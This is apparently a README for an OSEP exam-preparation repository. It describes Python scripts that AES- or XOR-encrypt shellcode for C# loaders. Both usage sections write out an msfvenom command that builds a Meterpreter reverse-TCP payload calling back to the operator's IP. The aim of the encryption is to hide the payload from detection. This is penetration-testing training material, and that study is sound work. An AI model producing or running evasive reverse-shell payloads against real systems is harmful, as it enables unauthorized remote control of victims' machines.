# OSEP
This will eventually become an OSEP code repository. 
For now I am placing 2 python scripts to help out with encrypting your shellcode.  
You have the option of using aes256.py OR xor.py depending what you are using for your c# shellcode!


I've seen other repos that made the same tool but in c#, I figured i'd try and do it in python and make it a bit easier to copy and paste over to your code!



  ## AES256enc.py What does it do.
This Python script encrypts c# shellcode using AES (Advanced Encryption Standard) in CBC (Cipher Block Chaining) mode.  
It generates a random AES key and IV (Initialization Vector), encrypts the shellcode, and outputs the encrypted data in a format compatible with C# applications.

**Output Results:**
- C# AES Key: The AES encryption key in xx-xx format.
- C# IV Key: The initialization vector (IV) in xx-xx format.
- C# Encrypted Shellcode: A formatted byte array containing the encrypted shellcode and its size, ready to use in C# applications.


## AES256enc.py Requirements
AES256.py uses cryptodome for AES and padding. In order to install you need to run  
`sudo apt update`  
`sudo apt install python3-pycryptodome`


## Usage
- create msfvenom shellcode in csharp format.  
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f csharp`
- now copy all shellcode in between {} and place it into buf contents of the script.
-  now run `python3 aes256enc.py`
- Shellcode has been formatted to paste into 1 line when you copy it over to visual studio code.
- Copy keys and shellcode into your c# program and enjoy!

  # Xorenc.py what does it do
  This Python script generates a random XOR key and encodes shellcode for use in C# applications. The encoded payload is formatted as a C# byte[] array, ready for integration into your projects.

  ## Features
  - Random XOR Key Generation: Produces a single-byte XOR key for obfuscating shellcode.
  - Shellcode Encoding: Encodes raw shellcode using the generated XOR key.
  - C# Output Formatting: Outputs the encoded payload as a byte[] array, compatible with C#.
 
  ## Usage
- create msfvenom shellcode in csharp format.  
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f csharp`
- now copy all shellcode in between {} and place it into buf contents of the script.
-  now run `python3 xorenc.py`
- Shellcode has been formatted to paste as 1 line when you copy it over to visual studio code.
- Copy key and shellcode into your c# program and enjoy!



